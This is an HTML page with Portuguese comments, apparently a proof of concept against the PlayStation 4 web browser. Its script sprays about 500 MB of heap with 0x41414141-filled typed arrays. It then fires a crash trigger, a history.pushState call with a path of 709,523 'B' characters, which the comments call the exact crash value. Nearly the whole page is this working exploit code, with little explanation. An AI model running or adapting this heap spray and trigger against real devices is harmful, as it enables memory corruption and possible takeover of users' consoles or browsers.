<!DOCTYPE html>
<html>
<head>
    <title>PS4 Heap Spray Test</title>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 22px; padding: 15px; margin: 20px; cursor: pointer; 
            background: #222; color: #fff; border: 2px solid #00ff00; width: 80%;
        }
        #status { font-size: 24px; color: yellow; margin-bottom: 20px; }
    </style>
</head>
<body>

    <h1>Teste de Diagnóstico: Stack vs Heap</h1>
    <p>Vamos encher a memória (Spray) e depois atacar.</p>

    <div id="status">Aguardando...</div>

    <button onclick="runSprayAndCrash()">1. INICIAR SPRAY + CRASH</button>

    <script>
        var sprayStore = [];

        function runSprayAndCrash() {
            const status = document.getElementById('status');
            status.innerText = "1. Pulverizando memória (Aguarde)...";

            // Delay para dar tempo da UI atualizar
            setTimeout(() => {
                try {
                    // --- FASE 1: HEAP SPRAY ---
                    // Tenta criar 500 arrays de 1MB cada (500MB total)
                    // Isso força o navegador a reorganizar a memória Heap.
                    for (let i = 0; i < 500; i++) {
                        // Cria um array de Uint32 (números inteiros)
                        let arr = new Uint32Array(256 * 1024); 
                        
                        // Enche com "0x41414141" (AAAA)
                        for (let j = 0; j < arr.length; j++) {
                            arr[j] = 0x41414141;
                        }
                        sprayStore.push(arr);
                    }
                    
                    status.innerText = "Memória cheia! Disparando gatilho...";

                    // --- FASE 2: O GATILHO ---
                    setTimeout(() => {
                        // Usamos o valor EXATO que causa o crash
                        const OFFSET = 709523; 
                        const payload = "/" + "B".repeat(OFFSET);
                        
                        history.pushState({}, "spray_crash", payload);
                    }, 1000);

                } catch (e) {
                    status.innerText = "Erro no Spray (Memória cheia demais?): " + e.message;
                    // Se der erro de memória, tenta disparar o crash mesmo assim
                    const OFFSET = 709523; 
                    const payload = "/" + "B".repeat(OFFSET);
                    history.pushState({}, "spray_crash_fallback", payload);
                }
            }, 500);
        }
    </script>
</body>
</html>
